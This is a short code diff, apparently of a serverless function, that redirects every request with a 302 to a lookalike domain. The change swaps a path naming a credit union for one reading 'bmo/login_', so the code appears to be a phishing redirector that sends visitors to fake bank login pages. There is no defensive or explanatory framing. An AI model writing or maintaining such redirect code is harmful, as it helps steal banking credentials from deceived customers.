@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://accesunacctonline.info/sunward/fcu/",
+      Location: "https://acerevieaw.biz/bmo/login_/",
     },
   });
 });
